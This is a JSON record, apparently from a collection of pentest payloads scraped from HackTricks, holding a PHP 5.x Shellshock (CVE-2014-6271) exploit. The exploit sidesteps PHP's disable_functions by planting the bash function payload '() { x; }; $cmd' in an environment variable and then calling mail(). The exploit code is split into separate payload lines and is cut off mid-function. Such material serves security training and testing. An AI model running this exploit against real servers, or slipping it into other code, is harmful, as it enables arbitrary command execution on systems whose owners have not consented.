{
  "id": "network_services_pentesting_add33a3f9359",
  "category": "network-services-pentesting",
  "title": "disable functions php 5.x shellshock exploit",
  "description": "# PHP 5.x Shellshock Exploit\n\n{{#include ../../../../banners/hacktricks-training.md}}\n\nFrom [http://blog.safebuff.com/2016/05/06/disable-functions-bypass/](http://blog.safebuff.com/2016/05/06/disable-functions-bypass/)\n\n```php\n<?php\n\necho \"Disabled functions: \".ini_get('disable_functions').\"\\n\";\nfunction shellshock($cmd) { // Execute a command via CVE-2014-6271 @ mail.c:283\n   if(strstr(readlink(\"/bin/sh\"), \"bash\") != FALSE) {\n     $tmp = tempnam(\".\",\"data\");\n     putenv(\"PHP_LOL=() { x; }; $cmd",
  "payloads": [
    "# PHP 5.x Shellshock Exploit",
    "{{#include ../../../../banners/hacktricks-training.md}}",
    "From [http://blog.safebuff.com/2016/05/06/disable-functions-bypass/](http://blog.safebuff.com/2016/05/06/disable-functions-bypass/)",
    "```php",
    "echo \"Disabled functions: \".ini_get('disable_functions').\"\\n\";",
    "function shellshock($cmd) { // Execute a command via CVE-2014-6271 @ mail.c:283",
    "if(strstr(readlink(\"/bin/sh\"), \"bash\") != FALSE) {",
    "$tmp = tempnam(\".\",\"data\");",
    "putenv(\"PHP_LOL=() { x; }; $cmd >$tmp 2>&1\");",
    "// In Safe Mode, the user may only alter environment variables whose names",
    "// begin with the prefixes supplied by this directive.",
    "// By default, users will only be able to set environment variables that",
    "// begin with PHP_ (e.g. PHP_FOO=BAR). Note: if this directive is empty,",
    "// PHP will let the user modify ANY environment variable!",
    "mail(\"a@127.0.0.1\",\"\",\"\",\"\",\"-bv\"); // -bv so we don't actually send any mail"
  ],
  "source": "HackTricks",
  "references": [
    "/workspaces/hunter-skill/hacktricks/src/network-services-pentesting/pentesting-web/php-tricks-esp/php-useful-functions-disable_functions-open_basedir-bypass/disable_functions-php-5.x-shellshock-exploit.md"
  ]
}